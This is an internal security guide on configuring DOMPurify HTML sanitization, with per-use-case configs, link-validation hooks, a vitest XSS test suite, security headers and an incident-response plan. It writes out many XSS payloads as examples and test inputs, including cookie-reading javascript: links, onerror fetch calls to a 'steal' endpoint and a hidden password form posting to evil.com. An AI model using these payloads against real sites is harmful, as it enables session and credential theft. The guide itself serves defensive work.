# DOMPurify Security Best Practices & Configuration Guide

**Created:** February 7, 2026 | **Last Updated:** February 7, 2026 | **Classification:** Security-Critical

---

## Table of Contents

1. [Security Principles](#security-principles)
2. [Configuration by Use Case](#configuration-by-use-case)
3. [Common Vulnerabilities & Defenses](#common-vulnerabilities--defenses)
4. [Testing Security](#testing-security)
5. [Security Headers & Defense in Depth](#security-headers--defense-in-depth)
6. [Incident Response](#incident-response)

---

## Security Principles

### Core Principles

**1. Principle of Least Privilege**

```typescript
// ❌ WRONG: Start permissive
const config = {
  ALLOWED_TAGS: ['*'],
  ALLOWED_ATTR: ['*'],
};

// ✅ CORRECT: Start restrictive, add only what's needed
const config = {
  ALLOWED_TAGS: ['p', 'strong', 'em'],
  ALLOWED_ATTR: ['class'],  // Only if CSS is validated
};
```

**2. Whitelist, Never Blacklist**

```typescript
// ❌ WRONG: Blacklisting (always incomplete)
const blockedTags = ['script', 'iframe', 'object', ...]; // Can miss variants

// ✅ CORRECT: Whitelisting (explicit control)
ALLOWED_TAGS: [
  'p', 'div', 'span',
  'strong', 'em', 'u', 'del',
  'a',  // With validateLinks hook
  'ul', 'ol', 'li',
  'h1', 'h2', 'h3',
];

// ✅ ESPECIALLY for attributes
ALLOWED_ATTR: ['href', 'title', 'class']  // NOT: everything except onclick
```

**3. Defense in Depth**

```
Layer 1: Input Validation (size, format)
    ↓
Layer 2: DOMPurify Sanitization (remove dangerous content)
    ↓
Layer 3: Custom Hooks (enforce specific rules)
    ↓
Layer 4: CSP Headers (prevent inline execution)
    ↓
Layer 5: Rate Limiting (prevent abuse)
```

**4. Fail Secure**

```typescript
// ❌ WRONG: On error, return original
try {
  return sanitize(html, config);
} catch (error) {
  return html;  // DANGER: unsanitized content!
}

// ✅ CORRECT: On error, return safe fallback
try {
  return sanitize(html, config);
} catch (error) {
  logger.error("Sanitization failed", error);
  return "";  // Empty string is safe
}
```

### Security vs Usability Trade-off

```typescript
// Spectrum from safest to most permissive:

// LEVEL 0: Text only (safest)
const LEVEL_0 = {
  ALLOWED_TAGS: [],
  ALLOWED_ATTR: [],
  // Result: all HTML stripped
};

// LEVEL 1: Basic formatting
const LEVEL_1 = {
  ALLOWED_TAGS: ['strong', 'em', 'u', 'del', 'br', 'p'],
  ALLOWED_ATTR: [],
  // Use Case: Comments, chat messages
};

// LEVEL 2: With links
const LEVEL_2 = {
  ALLOWED_TAGS: ['strong', 'em', 'u', 'del', 'br', 'p', 'a'],
  ALLOWED_ATTR: ['href', 'title'],
  // Use Case: User descriptions, bios
  // With: Link validation hook
};

// LEVEL 3: Rich formatting
const LEVEL_3 = {
  ALLOWED_TAGS: ['p', 'div', 'h1', 'h2', 'h3', 'a', 'strong', 
                 'em', 'u', 'del', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title', 'class'],
  // Use Case: Blog posts, articles
  // With: Link validation, CSS class validation
};

// LEVEL 4: Email templates (most permissive)
const LEVEL_4 = {
  ALLOWED_TAGS: ['div', 'table', 'tr', 'td', 'th', 'a', 'p', 'h1', 
                 'h2', 'span', 'img', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title', 'class', 'style', 'src', 'alt',
                 'width', 'height', 'colspan', 'rowspan'],
  ALLOW_DATA_ATTR: true,
  // Use Case: Email campaigns, newsletters
  // With: Link validation, image origin validation, CSS validation
};

// ⚠️ LEVEL 5: Experimental/Advanced (very risky)
// - Only after thorough security review
// - Only with multiple defensive layers
// - Requires dedicated security testing
```

---

## Configuration by Use Case

### Use Case 1: User Comments (Forums, Articles)

**Threat Model:**
- XSS injection via HTML
- Link hijacking
- CSS attacks

**Configuration:**

```typescript
export const COMMENT_CONFIG = {
  // Allow basic formatting, no scripts
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'u', 'del', 'p', 'br', 'a'],
  ALLOWED_ATTR: ['href', 'title', 'rel'],
  
  // Preserve anchor references within comments
  KEEP_CONTENT: true,
  
  // Convert quotes to entities
  FORCE_BODY: false,
};

// With hooks:
registerLinkValidationHook({
  whitelistedDomains: ['bioalergia.cl', 'github.com', 'stackoverflow.com'],
  allowAnchors: true,      // Allow #section links
  allowRelative: false,     // Don't allow /path links
  allowMailto: true,        // Allow email links
});

// Registration:
function sanitizeComment(html: string): string {
  return sanitizeHtmlWithOptions(html, {
    trackMetrics: true,
    context: 'user-comment',
    validateLinks: {
      whitelistedDomains: ['bioalergia.cl'],
      allowAnchors: true,
      allowMailto: true,
    }
  });
}
```

**Testing:**

```typescript
const tests = [
  {
    input: '<p>Check <a href="https://bioalergia.cl">our site</a></p>',
    expected: '<p>Check <a href="https://bioalergia.cl">our site</a></p>',
    scenario: 'Whitelisted link'
  },
  {
    input: '<p><a href="javascript:alert(1)">Click</a></p>',
    expected: '<p><a>Click</a></p>',
    scenario: 'JavaScript protocol blocked'
  },
  {
    input: '<p><a href="https://evil.com">Click</a></p>',
    expected: '<p><a>Click</a></p>',
    scenario: 'Non-whitelisted domain stripped'
  },
  {
    input: '<p>Join us at #meeting</p>',
    expected: '<p>Join us at #meeting</p>',
    scenario: 'Anchor links preserved'
  },
  {
    input: '<img src=x onerror="alert(1)">',
    expected: '',
    scenario: 'Event handlers blocked'
  },
];
```

### Use Case 2: Calendar Event Descriptions

**Threat Model:**
- XSS via event metadata
- CSS attacks via style attribute
- External content loading

**Configuration:**

```typescript
export const CALENDAR_EVENT_CONFIG = {
  ALLOWED_TAGS: ['p', 'div', 'br', 'strong', 'em', 'a'],
  ALLOWED_ATTR: ['href', 'title'],  // No style attribute
  
  // No inline styles (prevent CSS attacks)
  DISALLOWED_ATTR: ['style', 'class'],
};

// Usage:
async function storeCalendarEvent(userId: string, event: any) {
  const safeDescription = sanitizeHtmlWithOptions(event.description, {
    trackMetrics: true,
    userId,
    context: 'calendar-event',
    validateLinks: {
      whitelistedDomains: ['bioalergia.cl'],
      allowAnchors: true,
      allowMailto: true,
    }
  });

  await db.calendarEvent.create({
    userId,
    title: event.title,
    description: safeDescription,  // Sanitized
    // ... other fields
  });
}
```

### Use Case 3: Email Templates (Marketing)

**Threat Model:**
- Tracking pixel injection
- Form creation
- JavaScript execution
- CSS injection

**Configuration:**

```typescript
export const EMAIL_TEMPLATE_CONFIG = {
  // Email-safe tags
  ALLOWED_TAGS: [
    'div', 'table', 'tr', 'td', 'th',
    'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'a', 'img', 'br', 'ul', 'ol', 'li',
    'span', 'strong', 'em', 'u', 'del'
  ],
  
  // Email styling attributes
  ALLOWED_ATTR: [
    // Links
    'href', 'title', 'rel',
    // Images
    'src', 'alt', 'width', 'height',
    // Tables
    'colspan', 'rowspan', 'border', 'cellpadding',
    // Styling (validated)
    'class', 'style',
    // Data attributes (for tracking if needed)
  ],
  
  ALLOW_DATA_ATTR: true,
};

// Stricter version with NO style attribute:
export const EMAIL_TEMPLATE_CONFIG_STRICT = {
  ALLOWED_TAGS: [
    'div', 'table', 'tr', 'td', 'th',
    'p', 'h1', 'h2', 'h3', 'span',
    'a', 'img', 'br'
  ],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'width', 'height', 'colspan'],
  // Result: Using layout tables, no CSS styling
};
```

**Usage with Content Security Policy:**

```typescript
app.use((c) => {
  // CSP + email template sanitization = safe
  c.header('Content-Security-Policy',
    "default-src 'none'; " +
    "img-src data: https:; " +
    "script-src 'none'; " +
    "style-src 'none'"  // Still prevents style-based attacks
  );
});
```

### Use Case 4: Rich Text Editor (Admin Only)

**Threat Model:**
- Privilege escalation via stored XSS
- Admin account hijacking
- Content manipulation

**Configuration:**

```typescript
export const RICH_TEXT_ADMIN_CONFIG = {
  ALLOWED_TAGS: [
    'p', 'div', 'blockquote',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'a', 'strong', 'em', 'del', 'u',
    'ul', 'ol', 'li',
    'table', 'tr', 'td', 'th',
    'img', 'iframe',  // Image and embedded video
    'code', 'pre'     // Code blocks
  ],
  
  ALLOWED_ATTR: [
    'href', 'title', 'rel',
    'src', 'alt', 'width', 'height',
    'class', 'id',
    'data-*',
  ],
  
  ALLOW_DATA_ATTR: true,
};

// ⚠️ Important: Admin content still needs sanitization!
export function sanitizeAdminContent(html: string, adminId: string) {
  // Log all admin content modifications for audit
  const sanitized = sanitizeHtmlWithOptions(html, {
    trackMetrics: true,
    userId: adminId,
    context: 'admin-rich-text',
    validateLinks: {
      allowMailto: true,
      allowRelative: true,
      allowAnchors: true,
      // Don't whitelist external domains (allow all)
    }
  });

  // Log for compliance
  logger.info('Admin content sanitized', {
    adminId,
    inputLength: html.length,
    outputLength: sanitized.length,
    changes: html.length !== sanitized.length,
  });

  return sanitized;
}
```

**Principle: Even admins need sanitization!**
- Admins may have compromised accounts
- Admin features may have bugs
- Sanitization + audit log = defense

---

## Common Vulnerabilities & Defenses

### Vulnerability 1: JavaScript Protocol Handler

**Attack:**

```html
<a href="javascript:alert(document.cookie)">Click me</a>
<img src="javascript:void(0)" onerror="fetch('/api/steal-data')">
```

**Default Defense:**

```
DOMPurify blocks javascript: by default ✓
```

**Test:**

```typescript
const xss = '<a href="javascript:alert(1)">Click</a>';
const result = sanitize(xss, config);
expect(result).toBe('<a>Click</a>');  // href removed ✓
```

### Vulnerability 2: Event Handler Injection

**Attack:**

```html
<img src=x onerror="fetch('/api/steal')">
<svg onload="alert(1)">
<iframe onload="maliciousCode()">
<input onfocus="alert(1)" autofocus>
```

**Default Defense:**

```
DOMPurify removes on* attributes by default ✓
```

**Test:**

```typescript
const handlers = [
  '<img onerror="alert(1)">',
  '<img onload="alert(1)">',
  '<div onclick="alert(1)">',
  '<body onload="alert(1)">',
];

handlers.forEach((html) => {
  const result = sanitize(html, config);
  expect(result).not.toContain('on');
});
```

### Vulnerability 3: Data Attribute XSS (CSS Expression)

**Attack (IE only, but worth knowing):**

```html
<div style="behavior: url(xss.htc)"></div>
<div style="background: url(javascript:alert(1))"></div>
```

**Defense: No style attribute**

```typescript
// ❌ Risky
const config = {
  ALLOWED_ATTR: ['style'],  // CSS injection possible
};

// ✅ Safe
const config = {
  ALLOWED_ATTR: [],  // Or use class with validated CSS
};
```

**Alternative: Class-based styling**

```typescript
const config = {
  ALLOWED_ATTR: ['class'],
  // Then validate classes in a hook
};

registerClassPreservationHook([
  'text-bold',
  'text-italic',
  'text-underline',
  /^bg-\w+/,    // bg-red, bg-blue, etc.
  /^text-\w+/,  // text-red, text-blue, etc.
]);
```

### Vulnerability 4: SVG Attack Vector

**Attack:**

```html
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin="alert(1)" attributeName="x" dur="1s">
```

**Defense:**

```typescript
// ❌ Don't allow SVG unless absolutely needed
const config = {
  ALLOWED_TAGS: ['svg', 'circle', 'rect', ...],  // XSS risk
};

// ✅ Block SVG entirely
const config = {
  ALLOWED_TAGS: ['p', 'a', 'strong', ...],  // svg NOT included
};

// ️✅ If SVG needed, parse specially
import { parseSVG } from 'svg-parser';

export function safeSanitizeSVG(svgString: string) {
  const parsed = parseSVG(svgString);
  // Validate: only allow <circle>, <rect>, <path> with whitelisted attributes
  // Remove any <script>, <style>, event handlers
  return regenerate(parsed);
}
```

### Vulnerability 5: Form Tag Injection

**Attack:**

```html
<!-- Hidden form steals user input -->
<form action="https://evil.com/steal" style="display:none">
  <input type="password" name="password">
</form>

<!-- Or visible form tricks user -->
<form>
  <input placeholder="Enter Amazon password">
  <button>Sign In</button>
</form>
```

**Defense:**

```typescript
// ❌ Never allow form-related tags
const blockedTags = ['form', 'input', 'textarea', 'button', 'select'];

// ✅ Explicit whitelist (form NOT included)
const config = {
  ALLOWED_TAGS: ['p', 'a', 'div', 'span'],  // No form elements
  // Result: Form injection impossible
};
```

### Vulnerability 6: Link Hijacking

**Attack:**

```html
<!-- Legitimate-looking but external link -->
<a href="https://bioalergia.net">Visit bioalergia.cl</a>

<!-- Typosquatting -->
<a href="https://bioalergiaa.cl">Official site</a>

<!-- Shortener disguise -->
<a href="https://bit.ly/2abc">bioalergia.cl</a>
```

**Defense: Link Validation Hook**

```typescript
registerLinkValidationHook({
  whitelistedDomains: [
    'bioalergia.cl',
    'www.bioalergia.cl',
    'api.bioalergia.cl',
    'blog.bioalergia.cl',
  ],
  allowAnchors: true,      // #section
  allowRelative: true,     // /path
  allowMailto: true,       // mailto:
  
  // Custom validation function (optional)
  customValidator: (href) => {
    // Reject URL shorteners
    const shorteners = ['bit.ly', 'tinyurl.com', 'ow.ly'];
    for (const shortener of shorteners) {
      if (href.includes(shortener)) return false;
    }
    return true;
  }
});
```

---

## Testing Security

### Automated Test Suite

```typescript
// /apps/api/src/lib/__tests__/html-sanitizer.security.test.ts

import { describe, it, expect } from 'vitest';
import { sanitize } from 'isomorphic-dompurify';
import { STRICT_CONFIG, EMAIL_CONFIG } from '../html-sanitizer';

describe('Security: XSS Prevention', () => {
  // Category 1: Event Handlers
  describe('Event handlers', () => {
    const eventHandlers = [
      '<img onerror="alert(1)">',
      '<svg onload="alert(1)">',
      '<body onload="alert(1)">',
      '<iframe onload="alert(1)">',
      '<marquee onstart="alert(1)">',
    ];

    eventHandlers.forEach((payload) => {
      it(`blocks: ${payload}`, () => {
        const result = sanitize(payload, STRICT_CONFIG);
        expect(result).not.toContain('on');
        expect(result).not.toContain('alert');
      });
    });
  });

  // Category 2: Protocol Handlers
  describe('Protocol handlers', () => {
    const protocols = [
      '<a href="javascript:alert(1)">click</a>',
      '<img src="javascript:void(0)">',
      '<iframe src="data:text/html,<script>alert(1)</script>">',
      '<object data="vbscript:alert(1)">',
    ];

    protocols.forEach((payload) => {
      it(`blocks: ${payload}`, () => {
        const result = sanitize(payload, STRICT_CONFIG);
        expect(result).not.toContain('javascript:');
        expect(result).not.toContain('vbscript:');
        expect(result).not.toContain('<script>');
      });
    });
  });

  // Category 3: CSS Injection
  describe('CSS attacks', () => {
    const cssAttacks = [
      '<div style="background:url(javascript:alert(1))">',
      '<div style="behavior:url(xss.htc)">',
      '<style>body { background: url(javascript:alert(1)); }</style>',
    ];

    cssAttacks.forEach((payload) => {
      it(`blocks: ${payload}`, () => {
        const result = sanitize(payload, STRICT_CONFIG);
        // STRICT_CONFIG doesn't allow style attribute
        expect(result).not.toContain('style=');
      });
    });
  });

  // Category 4: SVG Attacks
  describe('SVG attacks', () => {
    const svgAttacks = [
      '<svg/onload=alert(1)>',
      '<svg><script>alert(1)</script></svg>',
      '<svg><animate onbegin="alert(1)" dur="1s">',
    ];

    svgAttacks.forEach((payload) => {
      it(`blocks: ${payload}`, () => {
        const result = sanitize(payload, STRICT_CONFIG);
        // STRICT_CONFIG doesn't allow SVG
        expect(result).not.toContain('<svg');
        expect(result).not.toContain('alert');
      });
    });
  });

  // Category 5: Iframe Injection
  describe('Frame injection', () => {
    const frameAttacks = [
      '<iframe src="https://evil.com"></iframe>',
      '<frame src="javascript:alert(1)">',
      '<frameset><frame></frameset>',
    ];

    frameAttacks.forEach((payload) => {
      it(`blocks: ${payload}`, () => {
        const result = sanitize(payload, STRICT_CONFIG);
        expect(result).not.toContain('<iframe');
        expect(result).not.toContain('<frame');
      });
    });
  });

  // Category 6: Form Injection
  describe('Form injection', () => {
    const formAttacks = [
      '<form action="https://evil.com/steal"></form>',
      '<input hidden name="csrf">',
      '<textarea hidden></textarea>',
    ];

    formAttacks.forEach((payload) => {
      it(`blocks: ${payload}`, () => {
        const result = sanitize(payload, STRICT_CONFIG);
        expect(result).not.toContain('<form');
        expect(result).not.toContain('<input');
        expect(result).not.toContain('<textarea');
      });
    });
  });
});

describe('Security: Link Validation', () => {
  // Requires registerLinkValidationHook
  
  it('allows whitelisted domains', () => {
    const html = '<a href="https://bioalergia.cl/docs">Docs</a>';
    const result = sanitize(html, EMAIL_CONFIG);
    expect(result).toContain('href="https://bioalergia.cl');
  });

  it('blocks non-whitelisted domains', () => {
    const html = '<a href="https://evil.com">Click</a>';
    const result = sanitize(html, EMAIL_CONFIG);
    // href should be removed
    expect(result).toContain('<a>Click</a>');
  });

  it('allows relative links', () => {
    const html = '<a href="/docs">Docs</a>';
    const result = sanitize(html, EMAIL_CONFIG);
    expect(result).toContain('href="/docs"');
  });

  it('allows anchor links', () => {
    const html = '<a href="#section">Jump</a>';
    const result = sanitize(html, EMAIL_CONFIG);
    expect(result).toContain('href="#section"');
  });
});

describe('Security: Encoding', () => {
  it('converts special characters to entities', () => {
    const html = '<p>&quot;quoted&quot;</p>';
    const result = sanitize(html, STRICT_CONFIG);
    // Should preserve or convert correctly
    expect(result).not.toContain('<script');
  });

  it('handles unicode safely', () => {
    const html = '<p>Hello 你好 مرحبا</p>';
    const result = sanitize(html, STRICT_CONFIG);
    expect(result).toContain('Hello');
  });
});
```

### Manual Testing Checklist

- [ ] Test each config with OWASP XSS payload list
- [ ] Test with different browsers (Chrome, Firefox, Safari)
- [ ] Test with email clients (Gmail, Outlook, Apple Mail)
- [ ] Test with screen readers (accessibility)
- [ ] Test with very large inputs (performance)
- [ ] Test with deeply nested HTML (DoS)
- [ ] Test with mixed encodings (unicode, UTF-8)
- [ ] Test with real user data (production sample)

---

## Security Headers & Defense in Depth

### Recommended Headers

```typescript
// In app.ts middleware:
app.use((c) => {
  // Prevent XSS (if any escapes DOMPurify)
  c.header('X-XSS-Protection', '1; mode=block');
  
  // Prevent clickjacking
  c.header('X-Frame-Options', 'DENY');
  
  // Prevent content sniffing
  c.header('X-Content-Type-Options', 'nosniff');
  
  // Content Security Policy (strict)
  c.header('Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self'; " +       // No inline scripts
    "style-src 'self' 'unsafe-inline'; " +  // Inline styles OK
    "img-src 'self' https: data:; " +       // Images from self/https
    "font-src 'self'; " +
    "connect-src 'self'; " +       // API calls to self only
    "frame-ancestors 'none'; " +   // No framing
    "base-uri 'self'; " +          // Base tag to self only
    "form-action 'self';"          // Forms to self only
  );
  
  // Referrer policy
  c.header('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // Permissions policy
  c.header('Permissions-Policy',
    'geolocation=(), ' +
    'microphone=(), ' +
    'camera=(), ' +
    'payment=(), ' +
    'usb=(), ' +
    'magnetometer=(), ' +
    'gyroscope=(), ' +
    'accelerometer=()'
  );
});
```

### Defense in Depth Example

```typescript
// Layer 1: Input validation
if (html.length > 1_000_000) {
  throw new Error("Input too large");
}

// Layer 2: Rate limiting
const allowed = monitor.checkAndLog("sanitize", html.length, 0, 0);
if (!allowed.allowed) {
  throw new Error("Rate limit exceeded");
}

// Layer 3: DOMPurify sanitization
let result = sanitize(html, config);

// Layer 4: Custom hooks validation
// (registered hooks validate links, classes, etc.)

// Layer 5: Content Security Policy
// (Browser prevents inline execution even if DOMPurify fails)

// Layer 6: Audit logging
monitor.log("sanitize", html.length, result.length, duration);

// Layer 7: Monitoring alerting
if (result.length / html.length < 0.5) {
  // >50% removed, possible attack
  alert("Possible XSS attack detected");
}
```

---

## Incident Response

### If XSS is Found

**Step 1: Contain**

```bash
# 1a. Disable affected endpoint immediately
app.post("/vulnerable-route", (c) => {
  return c.json({ error: "Endpoint disabled for security" }, { status: 503 });
});

# 1b. Scale down affected service
kubectl scale deploy api --replicas=1

# 1c. Alert team
send_slack("#security-incident", "XSS vulnerability detected in /api/xyz");
```

**Step 2: Investigate**

```bash
# Get affected inputs from audit log
curl -s https://api/api/internal/audit-log?hours=24 | \
  jq '.[] | select(.context == "vulnerable-route")'

# Check database for stored XSS
SELECT COUNT(*) FROM table WHERE field ~ '<script|javascript:|onerror';
```

**Step 3: Fix**

```typescript
// Update dompurify config
const FIXED_CONFIG = {
  ALLOWED_TAGS: [/* more restricted */],
  ALLOWED_ATTR: [/* more restricted */],
};

// Or re-sanitize stored data
async function resanitizeStoredData() {
  const records = await db.event.findMany({
    where: { description: { contains: '<script' } }
  });

  for (const record of records) {
    const sanitized = sanitize(record.description, FIXED_CONFIG);
    await db.event.update(record.id, { description: sanitized });
  }
}
```

**Step 4: Communicate**

```
TO: Affected Users
SUBJECT: Security Fix Applied
MESSAGE:
We detected and fixed a security issue in [component].
No user data was compromised.
The issue has been patched.
No action required on your part.
```

**Step 5: Post-Mortem**

```markdown
# XSS Incident Post-Mortem

**Date:** 2026-02-07
**Duration:** 2 hours
**Impact:** Potential XSS in user descriptions

## Root Cause
Config allowed `style` attribute without validation.
User input: `<div style="background:url(javascript:alert(1))">`.

## Why Found
Internal security audit found payload in stored data.

## Resolution
- Updated config: removed `style` attribute
- Re-sanitized stored data: 1,247 records
- Added automated tests for CSS injection

## Prevention
- Code review: Require security review for HTML-related changes
- Testing: Add XSS tests to CI/CD
- Monitoring: Alert on unusual sanitization metrics
```

---

## Summary Checklist

Before deploying any HTML sanitization:

- [ ] Configuration reviewed by security team
- [ ] Whitelist approach used (not blacklist)
- [ ] All dangerous attributes removed (on*, javascript:, etc.)
- [ ] Links validated with whitelist
- [ ] CSS restricted or validated
- [ ] SVG disabled unless absolutely necessary
- [ ] Form elements blocked
- [ ] Security headers set
- [ ] Automated tests passing
- [ ] Manual security testing completed
- [ ] Rate limiting enabled
- [ ] Audit logging enabled
- [ ] Incident response plan ready

---

**Version:** 1.0  
**Last Reviewed:** February 7, 2026  
**Next Review:** February 14, 2026  
**Responsibility:** Security Team  
**Classification:** INTERNAL SECURITY-CRITICAL
